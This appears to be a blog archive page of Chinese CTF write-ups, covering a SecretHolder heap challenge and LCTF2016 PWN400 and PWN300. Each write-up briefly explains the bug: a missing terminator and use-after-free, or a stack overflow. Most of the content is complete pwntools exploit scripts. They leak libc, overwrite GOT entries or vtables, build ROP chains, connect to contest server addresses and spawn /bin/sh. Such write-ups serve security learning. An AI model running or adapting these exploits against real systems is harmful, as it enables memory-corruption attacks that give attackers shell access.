class="line">111</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">New</span><span class="params">(p, type, content)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'3. Renew secret\n'</span>)</div><div class="line">    p.send(<span class="string">'1\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'3. Huge secret\n'</span>)</div><div class="line">    p.send(str(type) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Tell me your secret: \n'</span>)</div><div class="line">    p.send(content)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Wipe</span><span class="params">(p, type)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'3. Renew secret\n'</span>)</div><div class="line">    p.send(<span class="string">'2\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'3. Huge secret\n'</span>)</div><div class="line">    p.send(str(type) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ReNew</span><span class="params">(p, type, content)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'3. Renew secret\n'</span>)</div><div class="line">    p.send(<span class="string">'3\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'3. Huge secret\n'</span>)</div><div class="line">    p.send(str(type) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Tell me your secret: \n'</span>)</div><div class="line">    p.send(content)</div><div class="line"></div><div class="line">p = process(<span class="string">'./SecretHolder'</span>)</div><div class="line"></div><div class="line">elf = ELF(<span class="string">'./SecretHolder'</span>)</div><div class="line">libc = ELF(<span class="string">'./local.libc'</span>)</div><div class="line"></div><div class="line">read_got = elf.got[<span class="string">'read'</span>]</div><div class="line">free_got = elf.got[<span class="string">'free'</span>]</div><div class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</div><div class="line">offset_read = libc.symbols[<span class="string">'read'</span>]</div><div class="line">offset_system = libc.symbols[<span class="string">'system'</span>]</div><div class="line"></div><div class="line">New(p, <span class="number">3</span>, <span class="string">'A'</span> * <span class="number">8</span>)</div><div class="line">Wipe(p, <span class="number">3</span>)</div><div class="line"></div><div class="line">New(p, <span class="number">1</span>, <span class="string">'B'</span> * <span class="number">8</span>)</div><div class="line">Wipe(p, <span class="number">1</span>)</div><div class="line"></div><div class="line">New(p, <span class="number">3</span>, <span class="string">'A'</span> * <span class="number">8</span>)</div><div class="line"></div><div class="line">Wipe(p, <span class="number">1</span>)</div><div class="line"></div><div class="line">New(p, <span class="number">1</span>, <span class="string">'A'</span> * <span class="number">8</span>)</div><div class="line">New(p, <span class="number">2</span>, <span class="string">'B'</span> * <span class="number">8</span>)<span class="comment"># now three chunk are overlapping</span></div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += <span class="string">'A'</span> * <span class="number">0x20</span></div><div class="line">payload += p64(<span class="number">0x00</span>)</div><div class="line">payload += p64(<span class="number">0x31</span>)</div><div class="line">payload += <span class="string">'A'</span> * <span class="number">0x20</span></div><div class="line">payload += p64(<span class="number">0x00</span>)</div><div class="line">payload += p64(<span class="number">0x081021</span>)<span class="comment">#make two fake fast_chunk, control small_ptr, prepare for unlink attack</span></div><div class="line"></div><div class="line">ReNew(p, <span class="number">3</span>, payload)</div><div class="line"></div><div class="line">Wipe(p, <span class="number">1</span>)</div><div class="line">Wipe(p, <span class="number">2</span>)</div><div class="line"></div><div class="line">New(p, <span class="number">1</span>, <span class="string">'A'</span> * <span class="number">0x08</span>)</div><div class="line">New(p, <span class="number">2</span>, <span class="string">'B'</span> * <span class="number">0x08</span>)</div><div class="line"></div><div class="line">ptr = <span class="number">0x6020b0</span></div><div class="line"></div><div class="line">fake_fd = ptr - <span class="number">0x18</span></div><div class="line">fake_bk = fake_fd + <span class="number">0x08</span></div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += <span class="string">'\x00'</span> * <span class="number">0x30</span></div><div class="line">payload += p64(<span class="number">0x00</span>)</div><div class="line">payload += p64(<span class="number">0xfa1</span>)</div><div class="line">payload += p64(fake_fd)</div><div class="line">payload += p64(fake_bk)</div><div class="line">payload += <span class="string">'\x00'</span> * <span class="number">0xf80</span></div><div class="line">payload += p64(<span class="number">0xf80</span> + <span class="number">0x20</span>)</div><div class="line">payload += p64(<span class="number">0xfb0</span>)</div><div class="line"></div><div class="line">ReNew(p, <span class="number">3</span>, payload)</div><div class="line"></div><div class="line">Wipe(p, <span class="number">2</span>)<span class="comment">#free big chunk, unlink small chunk</span></div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += <span class="string">'\x00'</span> * <span class="number">0x10</span></div><div class="line">payload += p64(read_got)<span class="comment">#overwrite huge_ptr with read@got</span></div><div class="line">payload += p64(free_got)<span class="comment">#overwrite small_ptr with free@got</span></div><div class="line"></div><div class="line">ReNew(p, <span class="number">1</span>, payload)</div><div class="line">ReNew(p, <span class="number">1</span>, p64(puts_plt))<span class="comment">#write free@got with puts@plt</span></div><div class="line"></div><div class="line">Wipe(p, <span class="number">3</span>)<span class="comment">#free(huge_ptr) =&gt; puts(read@got)</span></div><div class="line"></div><div class="line"><span class="comment">#leak read() addr</span></div><div class="line">read_addr = u64(p.recvuntil(<span class="string">'\n1. Keep secret'</span>, drop = <span class="keyword">True</span>).ljust(<span class="number">0x08</span>, <span class="string">'\x00'</span>))</div><div class="line"></div><div class="line">log.info(<span class="string">'read() addr:'</span> + hex(read_addr))</div><div class="line"></div><div class="line">libc_base = read_addr - offset_read</div><div class="line">system_addr = libc_base + offset_system</div><div class="line"></div><div class="line"><span class="comment">#raw_input()</span></div><div class="line"></div><div class="line">ReNew(p, <span class="number">1</span>, p64(system_addr))<span class="comment">#write free@got with system()</span></div><div class="line"></div><div class="line">New(p, <span class="number">2</span>, <span class="string">'/bin/sh'</span>)<span class="comment">#write '/bin/sh'</span></div><div class="line"></div><div class="line">Wipe(p, <span class="number">2</span>)<span class="comment">#free(big_ptr) =&gt; system('/bin/sh')</span></div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>

      
    </div>
  </div>
</article>

  
    
    
    <article class="archive-article archive-type-post">
  <div class="archive-article-inner">
    <header class="archive-article-header">
      <div class="meta">
  
      <span class="date">
          2016-10-14
      </span>
  

  

  


</div>

      
    
      <h1 itemprop="name">
        LCTF2016 PWN400
      </h1>
    
  

    </header>

    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h2><blockquote>
<p>link: <a href="/2016/10/14/LCTF2016-PWN400/pwn400" title="pwn400">pwn400</a>  </p>
</blockquote>
<p>pwn400是一个有RSA加密解密功能的程序，存在如下两个结构体<br><img src="LCTF2016-PWN400/LCTF2016_PWN400_STRUCT.png" alt="">  </p>
<p>其中Cipher结构体中成员KeyPair是一个指向KeyPair结构体的指针  </p>
<h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><p>程序在保存Encrypt后的结果时没有添加’\0’截断，填满ciphertext就可以在输出时获取KeyPair的值从而得到堆基址<br>程序在执行decrypt功能后会将对应的Cipher堆块free<br><img src="LCTF2016-PWN400/LCTF2016_pWN400_VUL1.png" alt=""><br>但是没有将全局变量中CipherPtr的值置零，后续仍然可以继续使用，典型的UAF  </p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>利用comment功能<br><img src="LCTF2016-PWN400/LCTF2016_PWN400_VUL2.png" alt=""><br>申请内存覆盖到原来被delete掉的Cipher堆块，这样编辑comment就相当于修改Cipher堆块<br>直接修改vtable，达到控制程序流的目的<br>利用脚本如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">NewCipher</span><span class="params">(p, num_p, num_q)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'5. exit\n'</span>)</div><div class="line">    p.send(<span class="string">'1\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'[1]No\n'</span>)</div><div class="line">    p.send(<span class="string">'1\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'give me a prime number p: \n'</span>)</div><div class="line">    p.send(str(num_p) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'give me a prime number q: \n'</span>)</div><div class="line">    p.send(str(num_q) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Encrypt</span><span class="params">(p, length, plain)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'5. exit\n'</span>)</div><div class="line">    p.send(<span class="string">'2\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'length of your plaintext (max: 0x40)\n'</span>)</div><div class="line">    p.send(str(length) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'write your plaintext\n'</span>)</div><div class="line">    p.send(plain)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Decrypt</span><span class="params">(p, length, cipher)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'5. exit\n'</span>)</div><div class="line">    p.send(<span class="string">'3\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'length of your ciphertext (max: 0x200, hex encoded)\n'</span>)</div><div class="line">    p.send(str(length) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'write your ciphertext\n'</span>)</div><div class="line">    p.send(cipher)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Comment</span><span class="params">(p, content)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'5. exit\n'</span>)</div><div class="line">    p.send(<span class="string">'4\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'comment about my implement of RSA'</span>)</div><div class="line">    p.send(content)</div><div class="line"></div><div class="line"><span class="comment">#p = process('./pwn400')</span></div><div class="line">p = remote(<span class="string">'119.28.62.216'</span>, <span class="number">10023</span>)</div><div class="line">elf = ELF(<span class="string">'./pwn400'</span>)</div><div class="line">libc = ELF(<span class="string">'./local.libc'</span>)</div><div class="line"></div><div class="line">read_plt = elf.plt[<span class="string">'read'</span>]</div><div class="line">read_got = elf.got[<span class="string">'read'</span>]</div><div class="line">printf_plt = elf.plt[<span class="string">'printf'</span>]</div><div class="line">printf_got = elf.got[<span class="string">'printf'</span>]</div><div class="line">rand_got = elf.got[<span class="string">'rand'</span>]</div><div class="line">__libc_start_main_got = elf.got[<span class="string">'__libc_start_main'</span>]</div><div class="line"></div><div class="line">bss_addr = <span class="number">0x00000000006040E1</span></div><div class="line">pop7_ret = <span class="number">0x0000000000402336</span></div><div class="line">rdi_ret = <span class="number">0x0000000000402343</span></div><div class="line">rsi_r15_ret = <span class="number">0x0000000000402341</span></div><div class="line">main_addr = <span class="number">0x0000000000401D9D</span></div><div class="line">rsp_rbp_ret = <span class="number">0x000000000040153b</span></div><div class="line"></div><div class="line">NewCipher(p, <span class="number">17</span>, <span class="number">19</span>)</div><div class="line">Encrypt(p, <span class="number">0x40</span>, <span class="string">'A'</span> * <span class="number">0x40</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'ciphertext: '</span>)</div><div class="line"></div><div class="line">cipher = p.recvuntil(<span class="string">'000000000000'</span>)</div><div class="line">heap_addr = u64(p.recvuntil(<span class="string">'\n'</span>, drop = <span class="keyword">True</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</div><div class="line">heap_base = heap_addr - <span class="number">0x260</span></div><div class="line"></div><div class="line">log.info(<span class="string">'heap base '</span> + hex(heap_base))</div><div class="line"></div><div class="line">raw_input()</div><div class="line"></div><div class="line">rop1 = <span class="string">''</span></div><div class="line">rop1 += p64(rdi_ret) + p64(__libc_start_main_got)</div><div class="line">rop1 += p64(printf_plt) + p64(main_addr)</div><div class="line"></div><div class="line">Decrypt(p, len(cipher) / <span class="number">2</span>, cipher)</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += p64(heap_base) * <span class="number">2</span></div><div class="line">payload += p64(pop7_ret)</div><div class="line"></div><div class="line">Comment(p, payload + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">Encrypt(p, <span class="number">0x40</span>, rop1.ljust(<span class="number">0x40</span>, <span class="string">'A'</span>))</div><div class="line"></div><div class="line">rand_addr = u64(p.recvuntil(<span class="string">'RSA example'</span>, drop = <span class="keyword">True</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</div><div class="line"></div><div class="line">log.info(<span class="string">'__libc_start_main addr '</span> + hex(rand_addr))</div><div class="line"></div><div class="line">offset_rand = <span class="number">0x3d310</span></div><div class="line">offset_system = <span class="number">0x468f0</span></div><div class="line">offset_binsh = <span class="number">0x17dbc5</span></div><div class="line">offset_libc_start_main = <span class="number">0x21dd0</span></div><div class="line"><span class="string">'''</span></div><div class="line">offset_rand = libc.symbols['rand']</div><div class="line">offset_system = libc.symbols['system']</div><div class="line">offset_binsh = next(libc.search('/bin/sh'))</div><div class="line">offset_libc_start_main = libc.symbols['__libc_start_main']</div><div class="line">'''</div><div class="line">libc_base = rand_addr - offset_libc_start_main</div><div class="line">system_addr = libc_base + offset_system</div><div class="line">binsh = libc_base + offset_binsh</div><div class="line"></div><div class="line">rop2 = <span class="string">''</span></div><div class="line">rop2 += p64(rdi_ret) + p64(binsh)</div><div class="line">rop2 += p64(system_addr) + p64(main_addr)</div><div class="line"><span class="string">'''</span></div><div class="line">Encrypt(p, len(rop2), rop2)</div><div class="line">'''</div><div class="line"></div><div class="line">NewCipher(p, <span class="number">17</span>, <span class="number">19</span>)</div><div class="line"></div><div class="line">Encrypt(p, <span class="number">0x40</span>, <span class="string">'A'</span> * <span class="number">0x40</span>)</div><div class="line"></div><div class="line">Decrypt(p, len(cipher) / <span class="number">2</span>, cipher)</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += p64(heap_base + <span class="number">0x280</span>) * <span class="number">2</span></div><div class="line">payload += p64(pop7_ret)</div><div class="line"></div><div class="line">Comment(p, p64(<span class="number">0xdeadc0dedeadbeef</span>) * <span class="number">4</span> + <span class="string">'\n'</span>)</div><div class="line">Comment(p, p64(<span class="number">0xdeadc0dedeadbeef</span>) * <span class="number">4</span> + <span class="string">'\n'</span>)</div><div class="line">Comment(p, p64(<span class="number">0xdeadc0dedeadbeef</span>) * <span class="number">4</span> + <span class="string">'\n'</span>)</div><div class="line">Comment(p, payload + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">Encrypt(p, <span class="number">0x40</span>, rop2.ljust(<span class="number">0x40</span>, <span class="string">'A'</span>))</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>

      
    </div>
  </div>
</article>

  
    
    
    <article class="archive-article archive-type-post">
  <div class="archive-article-inner">
    <header class="archive-article-header">
      <div class="meta">
  
      <span class="date">
          2016-10-14
      </span>
  

  

  


</div>

      
    
      <h1 itemprop="name">
        LCTF2016 PWN300
      </h1>
    
  

    </header>

    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="程序-amp-amp-漏洞"><a href="#程序-amp-amp-漏洞" class="headerlink" title="程序&amp;&amp;漏洞"></a>程序&amp;&amp;漏洞</h2><blockquote>
<p>link: <a href="/2016/10/14/LCTF2016-PWN300/pwn300" title="pwn300">pwn300</a></p>
</blockquote>
<p>程序很简单，漏洞也很明显<br><img src="LCTF2016-PWN300/LCTF2016_PWN300_VUL.png" alt="">  </p>
<p>粗暴的栈溢出，但是程序运行需要两个比较特殊的库<br><img src="/LCTF2016-PWN300/LCTF2016_PWN300_ENV.png" alt=""><br>libgetshell显然是出题人自己写的，那么libio是个什么东西?<br>果断google之，找了各种有libio的库装了试试了装都没什么用，后来队友告诉我只要把libc改成libio就行了。。。<br><img src="/LCTF2016-PWN300/danm.png" alt=""><br>开头想直接远程leak函数地址找libc，但是libcdb.com和libc-database各种找找不着，估计服务器上面那个libio(libc)也是出题人自己写的<br>于是尝试dump整个libc，但是没有合适的控制rdx的gadget，无法控制一次read的字节数，没办法完整的dump出整个libc，本地不能直接用<br>不过用IDA分析代码段还是足够的<br>果不其然，libc里只有read，write和exit三个函数以及相应的syscall  </p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>因为有syscall，想办法控制rax为0x3b来执行execuv,利用libc里的syscall_0来执行read，将’/bin/sh’和syscall的地址写入got尾部<br>然后再执行read，控制rax，利用程序0x400480处的gadget，控制各寄存器的值来执行execuv(‘/bin/sh’, 0, 0) </p>
<p><img src="LCTF2016-PWN300/LCTF2016_PWN300_GADGET.png" alt="">  </p>
<p>脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"></div><div class="line"><span class="comment">#p = process('./pwn300')</span></div><div class="line">p = remote(<span class="string">'119.28.63.211'</span>, <span class="number">2339</span>)</div><div class="line"></div><div class="line">elf = ELF(<span class="string">'./pwn300'</span>)</div><div class="line"></div><div class="line">write_plt = elf.plt[<span class="string">'write'</span>]</div><div class="line">read_plt = elf.plt[<span class="string">'read'</span>]</div><div class="line">read_got = elf.got[<span class="string">'read'</span>]</div><div class="line">write_got = elf.got[<span class="string">'write'</span>]</div><div class="line">exit_got = elf.got[<span class="string">'exit'</span>]</div><div class="line"></div><div class="line">plt_start = <span class="number">0x400430</span></div><div class="line">link_map_addr = <span class="number">0x0000000000601008</span></div><div class="line">flag_got = <span class="number">0x0000000000601028</span></div><div class="line">unk_addr = <span class="number">0x0000000000400501</span></div><div class="line">main_addr = <span class="number">0x0000000004004A9</span></div><div class="line">rdi_ret = <span class="number">0x00000000004004a5</span></div><div class="line">rsi_r15_ret = <span class="number">0x00000000004004a3</span></div><div class="line">test_addr = <span class="number">0x0000000004004CA</span></div><div class="line">fuck_me = <span class="number">0x000000000400511</span></div><div class="line">write_sth = <span class="number">0x00000000004004B1</span></div><div class="line">bx_bp_12_13_14_15 = <span class="number">0x000000000040049C</span></div><div class="line">call_r12 = <span class="number">0x0000000000400484</span></div><div class="line">call_write = <span class="number">0x00000000004004C5</span></div><div class="line"></div><div class="line">offset_syscall_0 = <span class="number">0x43a</span></div><div class="line">offset_syscall_1 = <span class="number">0x40a</span></div><div class="line">offset_read = <span class="number">0x46a</span></div><div class="line">offset_syscall = <span class="number">0x466</span></div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'fuck me!\n'</span>)</div><div class="line"></div><div class="line">raw_input()</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += <span class="string">'A'</span> * <span class="number">0x28</span></div><div class="line">payload += p64(rdi_ret) + p64(<span class="number">0x01</span>)</div><div class="line">payload += p64(rsi_r15_ret) + p64(read_got) + p64(<span class="number">0x00</span>)</div><div class="line">payload += p64(write_plt) + p64(main_addr)</div><div class="line"></div><div class="line">p.send(payload.ljust(<span class="number">0xa0</span>, <span class="string">'\x00'</span>))</div><div class="line"></div><div class="line">read_addr = u64(p.recvuntil(<span class="string">'fuck me!\n'</span>, drop = <span class="keyword">True</span>)[:<span class="number">8</span>])</div><div class="line"></div><div class="line">log.info(<span class="string">'read addr '</span> + hex(read_addr))</div><div class="line"></div><div class="line">libc_base = read_addr - offset_read</div><div class="line">syscall_0_addr = libc_base + offset_syscall_0</div><div class="line">syscall_1_addr = libc_base + offset_syscall_1</div><div class="line">syscall_addr = libc_base + offset_syscall</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += <span class="string">'A'</span> * <span class="number">0x28</span></div><div class="line">payload += p64(rdi_ret) + p64(<span class="number">0x00</span>)</div><div class="line">payload += p64(rsi_r15_ret) + p64(exit_got) + p64(<span class="number">0x00</span>)</div><div class="line">payload += p64(syscall_0_addr)</div><div class="line">payload += p64(rdi_ret) + p64(<span class="number">0x01</span>)</div><div class="line">payload += p64(rsi_r15_ret) + p64(exit_got) + p64(<span class="number">0x00</span>)</div><div class="line">payload += p64(syscall_1_addr) + p64(main_addr)</div><div class="line"></div><div class="line"></div><div class="line">p.send(payload.ljust(<span class="number">0xa0</span>, <span class="string">'\x00'</span>))</div><div class="line"></div><div class="line">payload = <span class="string">'/bin/sh'</span> + <span class="string">'\x00'</span></div><div class="line">payload += p64(syscall_addr)</div><div class="line">payload = payload.ljust(<span class="number">58</span>, <span class="string">'\x00'</span>)</div><div class="line">payload += <span class="string">'\n'</span></div><div class="line"></div><div class="line">p.send(payload)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'fuck me!\n'</span>)</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += <span class="string">'A'</span> * <span class="number">0x28</span></div><div class="line">payload += p64(rdi_ret) + p64(<span class="number">0x00</span>)</div><div class="line">payload += p64(rsi_r15_ret) + p64(exit_got + <span class="number">0x10</span>) + p64(<span class="number">0x00</span>)</div><div class="line">payload += p64(syscall_0_addr)</div><div class="line">payload += p64(bx_bp_12_13_14_15)</div><div class="line">payload += p64(<span class="number">0x00</span>) * <span class="number">2</span></div><div class="line">payload += p64(exit_got + <span class="number">0x08</span>)</div><div class="line">payload += p64(<span class="number">0x00</span>)</div><div class="line">payload += p64(<span class="number">0x00</span>)</div><div class="line">payload += p64(exit_got)</div><div class="line">payload += p64(call_r12) + p64(main_addr)</div><div class="line"></div><div class="line">log.info(hex(len(payload)))</div><div class="line"></div><div class="line">p.send(payload)</div><div class="line"></div><div class="line">p.send(<span class="string">'A'</span> * <span class="number">58</span> + <span class="string">'\n'</span>)</div><div class="line"><span class="comment">#p.send('\n')</span></div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>比赛结束后看别的队伍的writeup，libgetshell里面有个getshell函数，直接往里跳就行了。。。<br><img src="LCTF2016-PWN300/su.png" alt=""><br>（可能是我dump的姿势不对，dump出来的libgetshell里面啥都没</p>

      
    </div>
  </div>
</article>

  
  
    </div></section>
  





      <!-- Three - the contact form is on every page! -->
        <section id="three">
          <h2>Get In Touch</h2>
<p>Us a service like Google forms or formspree to modify this partial in _partials/contact-form.</p>
<div class="row">
  <div class="8u 12u$(small)">
    <form method="post" action="#">
      <div class="row uniform 50%">
        <div class="6u 12u$(xsmall)"><input type="text" name="name" id="name" placeholder="Name" /></div>
        <div class="6u$ 12u$(xsmall)"><input type="email" name="email" id="email" placeholder="Email" /></div>
        <div class="12u$"><textarea name="message" id="message" placeholder="Message" rows="4"></textarea></div>
      </div>
    </form>
    <ul class="actions">
      <li><input type="submit" value="Send Message" /></li>
    </ul>
  </div>
  <div class="4u$ 12u$(small)">
    <ul class="labeled-icons">
      <li>
        <h3 class="icon fa-home"><span class="label">Address</span></h3>
        1234 Somewhere Rd.<br />
        Nashville, TN 00000<br />
        United States
      </li>
      <li>
        <h3 class="icon fa-mobile"><span class="label">Phone</span></h3>
        000-000-0000
      </li>
      <li>
        <h3 class="icon fa-envelope-o"><span class="label">Email</span></h3>
        <a href="#">hello@untitled.tld</a>
      </li>
    </ul>
  </div>
</div>
        </section>

        <!-- Footer -->
<footer id="footer">
    <div class="inner">

        <ul class="icons">
            
                <li><a href="https://twitter.com/?lang=en" class="icon fa-twitter" target="_blank" ><span class="label">Twitter</span></a></li>
            
            
                <li><a href="https://www.facebook.com/" class="icon fa-facebook" target="_blank" ><span class="label">Facebook</span></a></li>
            
            
                <li><a href="https://www.instagram.com/" class="icon fa-instagram" target="_blank" ><span class="label">Instagram</span></a></li>
            
            
                <li><a href="https://dribbble.com/" class="icon fa-dribbble" target="_blank" ><span class="label">Dribbble</span></a></li>
            
            
                <li><a href="https://github.com/klugjo/hexo-theme-phantom/commits?author=klugjo" class="icon fa-github" target="_blank" ><span class="label">GitHub</span></a></li>
            
            
                <li><a href="https://plus.google.com/" class="icon fa-google-plus" target="_blank" ><span class="label">Google+</span></a></li>
            
            
                <li><a href="https://www.behance.net/" class="icon fa-behance" target="_blank" ><span class="label">Behance</span></a></li>
            
            
                <li><a href="https://500px.com/" class="icon fa-500px" target="_blank" ><span class="label">500px</span></a></li>
            
            
                <li><a href="\#" class="icon fa-envelope-o" target="_blank" ><span class="label">Email</span></a></li>
            
            
                <li><a href="\#" class="icon  fa-rss" target="_blank" ><span class="label">RSS</span></a></li>
            
        </ul>

        <ul class="copyright">
            <li>&copy; Untitled. All rights reserved</li>
            <li>Design: <a href="http://html5up.net" target="_blank">HTML5 UP</a></li>
            <li>Hexo: <a href="http://livingos.com/" target="_blank">Tim Hyde</a></li>
        </ul>
    </div>
</footer>

        
    </div>

    <!-- After footer scripts -->
      <!-- Scripts -->
  <script src="/js/jquery.min.js"></script>  <script src="/js/jquery.poptrox.min.js"></script>  <script src="/js/skel.min.js"></script>  <script src="/js/util.js"></script>
  <!--[if lte IE 8]>
  <script src="/js/ie/respond.min.js"></script>
  <![endif]-->

  <script src="/js/main.js"></script>
  <!-- Disqus Comments -->
  


</body>
</html>
